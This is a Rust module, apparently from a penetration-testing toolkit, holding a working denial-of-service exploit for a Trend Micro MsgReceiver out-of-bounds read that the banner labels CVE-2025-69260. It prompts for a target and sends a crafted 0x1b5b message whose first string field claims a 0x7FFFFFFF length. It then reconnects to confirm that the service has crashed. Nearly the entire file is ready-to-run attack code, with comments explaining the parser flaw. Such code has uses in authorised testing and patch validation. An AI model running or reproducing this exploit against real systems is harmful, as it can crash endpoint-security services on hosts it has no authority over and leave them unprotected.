use anyhow::{Context, Result};
use colored::*;
use tokio::net::TcpStream;
use byteorder::{BigEndian, LittleEndian, WriteBytesExt};
use crate::utils::{prompt_default, prompt_required, prompt_port, prompt_yes_no, normalize_target};

const DEFAULT_PORT: u16 = 20001;

pub async fn run(target: &str) -> Result<()> {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    Trend Micro MsgReceiver DoS (CVE-2025-69260)           ║".cyan());
    println!("{}", "║    Out-of-bounds Read - Service Crash                     ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());

    // Parse target
    let target_host = if target.is_empty() {
        prompt_required("Target IP/Hostname")?
    } else {
        normalize_target(target)?
    };
    
    let target_host = target_host
        .trim_start_matches("http://")
        .trim_start_matches("https://")
        .split(':')
        .next()
        .unwrap_or(&target_host)
        .to_string();
    
    let port = prompt_port("Port", DEFAULT_PORT)?;

    println!("[*] Target: {}:{}", target_host, port);
    println!("{}", "[!] WARNING: This exploit will CRASH the MsgReceiver service!".red().bold());

    loop {
        println!("\n{}", "Select mode:".cyan());
        println!("1. Attack (DoS - OOB Read Crash)");
        println!("2. Exit");
        
        let choice = prompt_default("Select option", "2")?;

        match choice.as_str() {
            "1" => {
                if prompt_yes_no("This will crash the target service. Continue?", false)? {
                    exploit(&target_host, port).await?;
                }
            }
            "2" => break,
            _ => println!("{}", "Invalid choice".red()),
        }
    }

    Ok(())
}

async fn exploit(host: &str, port: u16) -> Result<()> {
    let addr = format!("{}:{}", host, port);
    println!("[*] Connecting to {}...", addr);
    
    let mut stream = TcpStream::connect(&addr).await
        .context("Failed to connect. Target might already be down.")?;

    // Vulnerability: Message 0x1b5b "old protocol" uses x_astring for fields.
    // CIPCMsgBuffer_GetStringPtr() advances CurPos by x_astring.size without bounds check.
    // Sending a huge size in first x_astring causes OOB read when parsing second field.
    //
    // struct msg_1b5b {
    //     hdr h;              // be32 MsgSize + byte unk[9]
    //     le16 MsgId;         // 0x1b5b
    //     x_astring SrcType;  // First string - WE LIE ABOUT SIZE HERE
    //     x_astring SrcIDr;   // Second string - triggers crash
    //     x_astring XMLData;
    // };
    // x_astring { le32 size; byte data[size]; };

    let msg_id: u16 = 0x1b5b;

    // First x_astring: claim huge size but send tiny data
    let src_type_data = b"A\0";
    let src_type_malicious_len: u32 = 0x7FFFFFFF; // Huge size causes OOB

    // Other strings (exist to complete structure)
    let src_idr_data = b"B\0";
    let src_idr_len = src_idr_data.len() as u32;
    
    let xml_data = b"C\0";
    let xml_len = xml_data.len() as u32;

    // Build body
    let mut body = Vec::new();
    body.write_u16::<LittleEndian>(msg_id)?;
    
    // SrcType with malicious size
    body.write_u32::<LittleEndian>(src_type_malicious_len)?;
    body.extend_from_slice(src_type_data);
    
    // SrcIDr (triggers crash when parser tries to read from OOB position)
    body.write_u32::<LittleEndian>(src_idr_len)?;
    body.extend_from_slice(src_idr_data);

    // XMLData
    body.write_u32::<LittleEndian>(xml_len)?;
    body.extend_from_slice(xml_data);

    // MsgSize = actual bytes sent (not the lie)
    let actual_body_len = body.len() as u32;
    let total_msg_size = 13 + actual_body_len;

    let mut buffer = Vec::new();
    // Header
    buffer.write_u32::<BigEndian>(total_msg_size)?;
    buffer.extend_from_slice(&[0u8; 9]);
    
    // Body
    buffer.extend_from_slice(&body);

    println!("[*] Sending malformed 0x1b5b message (OOB Read)...");
    println!("[*] SrcType.size set to: 0x{:08x} (2GB - causes OOB)", src_type_malicious_len);
    println!("[*] Actual payload size: {} bytes", buffer.len());
    
    if let Err(e) = tokio::io::AsyncWriteExt::write_all(&mut stream, &buffer).await {
        println!("{}", format!("[!] Connection closed during write: {}", e).yellow());
        println!("{}", "[+] This may indicate successful crash!".green());
    } else {
        println!("{}", "[+] Payload sent.".green());
    }

    // Verify crash
    println!("[*] Waiting 2 seconds then checking if target is down...");
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    
    match TcpStream::connect(&addr).await {
        Ok(_) => {
            println!("{}", "[-] Target still responding - may need multiple attempts.".yellow());
        }
        Err(_) => {
            println!("{}", "[+] Target DOWN! Connection refused/timeout.".green().bold());
            println!("{}", "[+] MsgReceiver service has crashed.".green());
        }
    }

    Ok(())
}
